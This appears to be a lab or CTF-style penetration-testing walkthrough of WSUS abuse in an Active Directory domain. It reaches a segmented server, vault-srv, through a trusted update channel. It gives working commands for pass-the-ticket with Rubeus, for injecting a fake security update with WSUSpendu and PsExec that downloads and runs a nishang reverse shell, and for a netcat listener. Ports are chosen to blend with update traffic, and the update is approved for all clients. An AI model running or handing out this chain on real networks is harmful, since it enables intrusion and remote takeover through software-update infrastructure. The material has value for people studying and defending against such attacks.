```powershell
# FROM IT-EMPLOYEE15
.\Rubeus.exe asktgt /user:administrator /ntlm:REDACTED_SECRET /domain:gcb.example /ptt

# Establish remote session
Enter-PSSession -ComputerName gcb-wsus.gcb.example
```

## ENUMERATION

#### 1. Confirm WSUS Role

```powershell
Get-WindowsFeature -Name UpdateServices
# Display Name                          Name             Install State
# ------------                          ----             -------------
# [X] Windows Server Update Services    UpdateServices   Installed
```

#### 2. Verify the WSUS Service is Running

```powershell
Get-Service -Name WSUSService
# Status   Name               DisplayName
# ------   ----               -----------
# Running  WSUSService        WSUS Service
```

#### 3. Enumerate IIS Sites Associated with WSUS

```powershell
Get-WebSite
# Name             ID   State      Physical Path                  Bindings
# ----             --   -----      -------------                  --------
# Default Web Site 1    Started    %SystemDrive%\inetpub\wwwroot  http *:80:
# WSUS             6416 Started    C:\Program Files\Update        http :8530:
# Administration   1704            Services\WebServices\Root\     https :8531: sslFlags=0
```

| Site | Port | Function |
| --- | --- | --- |
| Default Web Site | 80 | Standard IIS site |
| WSUS | 8530 | HTTP communication with WSUS clients |
| Administration | 8531 | WSUS admin console via HTTPS |

#### 4. Enumerate WSUS Clients

```powershell
Get-WsusComputer -All
# Computer  IP Address    Operating System             Last Status Report
# --------  ----------    ----------------             ------------------
# vault-srv 10.200.7.1 Windows Server 2019 Standard 7/19/2024 7:01:49 PM
```

> Client identified: `vault-srv` → `10.200.7.1` (`10.200.7.0/24`)

This network is not directly reachable from the compromised domains (`gcb.example` / `it.gcb.example`). Due to network segmentation, the only viable remote execution path is via the WSUS update distribution channel.

## ATTACK CHAIN

`GCB-WSUS` → WSUS role active → `vault-srv` identified as a managed client → segmented network (no direct access) → WSUS abuse → remote code execution → isolated segment reached → lateral movement to the host

## EXPLOITATION

#### 1. Serve Payload

```powershell
# Host the payload from IT-EMPLOYEE15
.\python.exe -m http.server 8530 --bind 0.0.0.0
```

An HTTP server is started to host  [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Port `8530` is used because it matches the default WSUS HTTP port, making generated traffic blend with legitimate update traffic.

> `Invoke-PowerShellTcp.ps1` includes at the end: `Invoke-PowerShellTcp -Reverse -IPAddress 10.200.5.15 -Port 8531`

The injection creates a fake update (`-Inject`) that:
- Bundles `PsExec64.exe` as the payload
- Executes PowerShell to download and run the reverse shell script

```
PsExec64.exe
  └─ powershell.exe
       └─ iex (iwr http://attacker/script.ps1)
            └─ reverse shell
```

#### 2. Start Listener

```powershell
# Set up reverse shell listener on IT-EMPLOYEE15
.\nc.exe -nlvp 8531
```

Port `8531` matches the WSUS HTTPS port — the reverse shell connection blends with legitimate traffic.

```
vault-srv → downloads payload from 10.200.5.15:8530
vault-srv → establishes reverse shell to 10.200.5.15:8531
```

#### 3. Inject Malicious WSUS Update

Tools: `WSUSpendu` (malicious update injection) | `PsExec` (payload execution)

```powershell
# From GCB-WSUS
.\WSUSpendu.ps1 -Inject -PayloadFile .\PsExec64.exe -PayloadArgs 'powershell -c "iex (iwr http://10.200.5.15:8530/Invoke-PowerShellTcp.ps1)"'
# To clean the injection, execute the following command:
# .\Wsuspendu.ps1 -Clean -UpdateID 7b76663d-10b8-4b09-899f-4850f74a20a4
# To check the update status for a specific computer, execute the following command:
# .\Wsuspendu.ps1 -check -UpdateID 7b76663d-10b8-4b09-899f-4850f74a20a4 -ComputerName [Computer name]
# Done

.\wsus.ps1 -Inject -PayloadFile .\px.exe -PayloadArgs 'powershell -c "iex (iwr http://10.200.5.15:8530/Invoke-PowerShellTcp.ps1)"'
```

#### 4. Verify the Malicious Update is Pending

```powershell
Get-WsusUpdate -Approval Unapproved
# Title                                        Classification    Approved
# -----                                        --------------    --------
# Bundle update for * Windows (from KB2862335) Security Updates NotApproved
```

#### 5. Approve the Update for Client Execution (allow a few minutes)

```powershell
Get-WsusUpdate -Approval Unapproved | Approve-WsusUpdate -Action Install -TargetGroupName "All Computers"
```

> Approves the malicious update for all WSUS clients, including `vault-srv`.

```
vault-srv
↓
downloads update
↓
executes payload
↓
reverse shell
↓
IT-EMPLOYEE15
```

Remote code execution on `vault-srv` is achieved.
